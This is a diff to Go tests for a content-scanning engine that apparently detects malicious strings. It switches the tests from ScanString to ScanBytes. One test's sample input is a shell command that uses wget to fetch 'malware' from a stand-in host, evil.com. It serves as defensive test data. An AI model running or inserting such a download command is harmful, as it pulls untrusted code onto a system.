@@ -30,10 +30,7 @@ func TestScanCleanFile(t *testing.T) {
 	e := NewEngine()
 	e.LoadDefaultRules()
 
-	result, err := e.ScanString("hello world this is clean text")
-	if err != nil {
-		t.Fatalf("scan error: %v", err)
-	}
+	result := e.ScanBytes([]byte("hello world this is clean text"), "clean.txt")
 	if result == nil {
 		t.Fatal("expected non-nil result")
 	}
@@ -43,10 +40,7 @@ func TestScanSuspiciousContent(t *testing.T) {
 	e := NewEngine()
 	e.LoadDefaultRules()
 
-	result, err := e.ScanString("/bin/sh -c wget http://evil.com/malware")
-	if err != nil {
-		t.Fatalf("scan error: %v", err)
-	}
+	result := e.ScanBytes([]byte("/bin/sh -c wget http://evil.com/malware"), "suspicious.txt")
 	if result == nil {
 		t.Fatal("expected non-nil result")
 	}
